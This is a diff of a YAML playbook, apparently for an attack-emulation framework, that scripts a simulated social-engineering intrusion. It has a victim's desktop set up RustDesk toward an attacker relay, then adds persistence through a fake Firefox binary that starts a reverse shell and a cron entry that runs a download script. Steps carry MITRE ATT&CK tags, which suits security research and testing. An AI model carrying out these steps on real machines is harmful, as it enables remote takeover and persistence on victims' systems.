@@ -83,7 +83,7 @@ commands:
     port: 5902
     creates_session: social_engineering
 
-# Opening a terminal from the menu
+  # Opening a terminal from the menu
 
   - type: vnc
     cmd: move
@@ -112,7 +112,7 @@ commands:
     session: social_engineering
 
   - type: sleep
-    seconds: 3
+    seconds: 5
 
   # copy something to the clipboard
   - type: vnc 
@@ -147,6 +147,10 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1105,T1566.004"
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Ingress Tool Transfer,Phishing: Spearphishing Voice"
 
   - type: sleep
     seconds: 45
@@ -161,7 +165,7 @@ commands:
       technique_name: "User Execution: Malicious Link,Remote Access Software"
 
   - type: sleep
-    seconds: 1
+    seconds: 3
 
   - type: vnc
     cmd: key
@@ -222,24 +226,24 @@ commands:
       technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
 
   - type: sleep
-    seconds: 2
+    seconds: 5
 
-# option menu
+# option menu (three dots next to id) 
   - type: vnc
     cmd: move
-    x: 167
-    y: 188
+    x: 174
+    y: 187
     session: social_engineering
 
   - type: sleep
-    seconds: 1
+    seconds: 3
 
   - type: vnc
     cmd: click
     session: social_engineering
 
   - type: sleep
-    seconds: 1
+    seconds: 3
 
 # network
   - type: vnc
@@ -324,6 +328,10 @@ commands:
   - type: vnc
     cmd: click
     session: social_engineering
+    metadata:
+      techniques: "T1219" # Configuring Remote Access SW to connect to attacker C2
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
 
   - type: sleep
     seconds: 1
@@ -437,12 +445,11 @@ commands:
     seconds: 10
 
 # enter the attacker ID in the rustdesk client on the attacker machine
-
 # option menu
   - type: vnc
     cmd: move
-    x: 167
-    y: 188
+    x: 173
+    y: 151
     session: attacker
 
   - type: sleep
@@ -451,6 +458,8 @@ commands:
   - type: vnc
     cmd: click
     session: attacker
+    metadata:
+      action: "click the option button"
 
   - type: sleep
     seconds: 1
@@ -458,13 +467,15 @@ commands:
 # network
   - type: vnc
     cmd: move
-    x: 82
-    y: 272
+    x: 73
+    y: 238
     session: attacker
 
   - type: vnc
     cmd: click
     session: attacker
+    metadata:
+      action: "click the network settings button"
 
   - type: sleep
     seconds: 1
@@ -473,12 +484,14 @@ commands:
   - type: vnc
     cmd: move
     x: 468
-    y: 131
+    y: 93
     session: attacker
 
   - type: vnc
     cmd: click
     session: attacker
+    metadata:
+      action: "click unlock network settings button"
 
   - type: sleep
     seconds: 1
@@ -500,15 +513,18 @@ commands:
     seconds: 2
 
 # id relay server
+
   - type: vnc
     cmd: move
-    x: 351
-    y: 182
+    x: 386
+    y: 155
     session: attacker
 
   - type: vnc
     cmd: click
     session: attacker
+    metadata:
+      action: "click in relay server field, enter attackmate IP"
 
   - type: sleep
     seconds: 5
@@ -525,13 +541,15 @@ commands:
 # Key Field
   - type: vnc
     cmd: move
-    x: 334
-    y: 439
+    x: 300
+    y: 401
     session: attacker
 
   - type: vnc
     cmd: click
     session: attacker
+    metadata:
+      action: "click in key field, enter public key"
 
   - type: sleep
     seconds: 5
@@ -548,9 +566,11 @@ commands:
 # click ok
   - type: vnc
     cmd: move
-    x: 621
-    y: 490
+    x: 623
+    y: 453
     session: attacker
+    metadata:
+      action: "click ok"
 
   - type: vnc
     cmd: click
@@ -597,6 +617,8 @@ commands:
     cmd: type 
     input: "rustdesk --connect $CLIENT_RUSTDESK_ID -p password"
     session: attacker
+    metadata:
+      action: "command for connection"
 
   - type: sleep
     seconds: 3
@@ -637,10 +659,11 @@ commands:
 
 ## attackers interactions via screenshares on the client desktop
 # select the vnc tab
+# TODO double check this
 
   - type: vnc
     cmd: move
-    x: 581
+    x: 708
     y: 754
     session: attacker
 
@@ -682,7 +705,7 @@ commands:
       technique_name: "Ingress Tool Transfer,Remote Access Software,Hide Artifacts: Hidden Files and Directories"
     
   - type: sleep
-    seconds: 1
+    seconds: 20
 
   - type: vnc
     cmd: key
@@ -707,7 +730,7 @@ commands:
       technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
     
   - type: sleep
-    seconds: 1
+    seconds: 20
 
   - type: vnc
     cmd: key
@@ -719,11 +742,11 @@ commands:
       technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
 
   - type: sleep
-    seconds: 5
+    seconds: 1
 
 #### Persistence OPTION A set up a fake firefox binary that executes the reverse shell and then the actual firefox
 
-
+  # TODO this download does not work. squid?
   # download the fake executable from attacker webserver
   - type: vnc
     cmd: type
@@ -735,7 +758,7 @@ commands:
       technique_name: "Ingress Tool Transfer,Remote Access Software"
 
   - type: sleep
-    seconds: 1
+    seconds: 10
 
   - type: vnc
     cmd: key
@@ -747,7 +770,7 @@ commands:
       technique_name: "Ingress Tool Transfer,Remote Access Software"
 
   - type: sleep
-    seconds: 1
+    seconds: 10
 
   # make it executable
   - type: vnc
@@ -760,7 +783,7 @@ commands:
       technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
 
   - type: sleep
-    seconds: 1
+    seconds: 10
 
   - type: vnc
     cmd: key
@@ -896,49 +919,37 @@ commands:
     session: revshell
     cmd: crontab -e
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: ":inoremap jj <ESC>"
-    metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   - type: msf-session
     session: revshell
     cmd: "o"
-    metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   - type: msf-session
     session: revshell
     cmd: "*/10 * * * * /home/judy/download.sh"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: "jj"
-    metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   - type: msf-session
     session: revshell
     cmd: ":wq!\n"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   # find out which windown are open
   - type: msf-session
@@ -963,9 +974,5 @@ commands:
     session: revshell
     cmd: exit
 
-
-  
-
-
-
-  
+  - type: sleep
+    seconds: 30 
